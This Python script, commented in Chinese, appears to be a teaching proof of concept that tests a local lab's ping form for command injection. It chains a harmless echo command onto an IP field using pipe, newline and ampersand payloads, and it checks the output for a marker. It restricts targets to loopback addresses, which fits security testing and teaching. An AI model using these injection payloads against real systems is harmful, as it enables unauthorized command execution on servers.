#!/usr/bin/env python3
# CMD-002 命令注入教学验证草案（仅本地授权靶场；只回显无害标记）
import argparse
import html
import ipaddress
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

MARK = 'CMD002_MARK_OK'
BASELINE_IP = '127.0.0.1'
DEFAULT_TIMEOUT = 10
PRE_RE = re.compile(r'<pre>(.*?)</pre>', re.IGNORECASE | re.DOTALL)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def check_base_url(base_url):
    parts = urllib.parse.urlsplit(base_url)
    if parts.scheme not in ('http', 'https'):
        raise SystemExit('拒绝非 http/https 目标: %r' % base_url)
    host = parts.hostname or ''
    allowed = host in ('localhost', '127.0.0.1', '::1')
    try:
        allowed = allowed or ipaddress.ip_address(host).is_loopback
    except ValueError:
        pass
    if not allowed:
        raise SystemExit('仅允许本地回环授权目标，拒绝: %r' % host)


def read_cookie(path):
    if not path:
        return None
    try:
        with open(path, 'r', encoding='utf-8') as fh:
            raw = fh.read().strip()
    except OSError as exc:
        raise SystemExit('无法读取 Cookie 文件: %s' % exc)
    if not raw:
        return None
    if raw.lower().startswith('cookie:'):
        raw = raw[7:].strip()
    raw = raw.replace(chr(13), ';').replace(chr(10), ';')
    parts = [item.strip() for item in raw.split(';')]
    return '; '.join([item for item in parts if item])


def post_form(opener, url, fields, cookie, timeout):
    data = urllib.parse.urlencode(fields).encode('utf-8')
    req = urllib.request.Request(url, data=data, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    req.add_header('User-Agent', 'CMD-002-lab-poc/1.0')
    if cookie:
        req.add_header('Cookie', cookie)
    try:
        with opener.open(req, timeout=timeout) as resp:
            return {'status': resp.status, 'body': resp.read().decode('utf-8', 'replace'), 'error': None}
    except urllib.error.HTTPError as exc:
        return {'status': exc.code, 'body': exc.read().decode('utf-8', 'replace'), 'error': None}
    except urllib.error.URLError as exc:
        return {'status': None, 'body': '', 'error': 'URLError: %s' % exc.reason}
    except (TimeoutError, OSError) as exc:
        return {'status': None, 'body': '', 'error': '%s: %s' % (type(exc).__name__, exc)}


def pre_text(body):
    blocks = []
    for match in PRE_RE.finditer(body):
        text = re.sub(r'<[^>]+>', '', match.group(1))
        blocks.append(html.unescape(text).strip())
    return blocks


def build_payloads(os_name):
    pipe = '%s | echo %s' % (BASELINE_IP, MARK)
    if os_name == 'windows':
        return [('pipe', pipe), ('single-amp', '%s & echo %s' % (BASELINE_IP, MARK))]
    newline = BASELINE_IP + chr(10) + 'echo ' + MARK
    return [('pipe', pipe), ('newline', newline)]


def run_case(opener, url, ip_value, cookie, timeout):
    resp = post_form(opener, url, {'Submit': 'Submit', 'ip': ip_value}, cookie, timeout)
    blocks = pre_text(resp['body'])
    joined = chr(10).join(blocks)
    return {
        'ip': ip_value,
        'status': resp['status'],
        'error': resp['error'],
        'pre': blocks,
        'marker_in_pre': MARK in joined,
        'marker_in_body': MARK in resp['body'],
    }


def show(label, case):
    print('[*] %s' % label)
    print('    ip      : %r' % case['ip'])
    print('    status  : %s' % case['status'])
    if case['error']:
        print('    error   : %s' % case['error'])
    if case['pre']:
        print('    <pre>   : %r' % case['pre'][0][:400])
    print('    marker in <pre> : %s' % case['marker_in_pre'])
    print('    marker in page  : %s' % case['marker_in_body'])


def main():
    ap = argparse.ArgumentParser(description='CMD-002 命令注入教学验证草案（本地靶场）')
    ap.add_argument('--base-url', default='http://127.0.0.1')
    ap.add_argument('--path', required=True, help='片段被包含的实际请求路径（由部署决定，本片段未给出）')
    ap.add_argument('--cookie-file', default=None)
    ap.add_argument('--os', dest='os_name', choices=('linux', 'windows'), default='linux')
    ap.add_argument('--timeout', type=float, default=DEFAULT_TIMEOUT)
    args = ap.parse_args()

    check_base_url(args.base_url)
    cookie = read_cookie(args.cookie_file)
    url = args.base_url.rstrip('/') + '/' + args.path.lstrip('/')
    opener = urllib.request.build_opener(NoRedirect)
    print('[*] target = %s (POST, Submit=Submit)' % url)
    print('[*] cookie = %s' % ('loaded' if cookie else 'none'))

    baseline = run_case(opener, url, BASELINE_IP, cookie, args.timeout)
    show('baseline ping', baseline)
    control = run_case(opener, url, MARK, cookie, args.timeout)
    show('reflection control', control)

    observed = []
    for name, ip_value in build_payloads(args.os_name):
        case = run_case(opener, url, ip_value, cookie, args.timeout)
        show('injection/%s' % name, case)
        observed.append((name, case['marker_in_pre'] and not control['marker_in_pre']))

    if baseline['error'] or control['error']:
        print('[!] 基线或对照请求失败，属环境/认证问题，不能据此判定漏洞不存在。')
        return 3
    if any(flag for _, flag in observed):
        print('[+] <pre> 区域出现独立标记，命令被 shell 额外执行（仍需人工按 success_criteria 复核）。')
        return 0
    print('[-] 本次未观察到标记：可能是 shell_exec/ping 不可用、路径或会话不符，不能直接判为不存在。')
    return 2


if __name__ == '__main__':
    sys.exit(main())
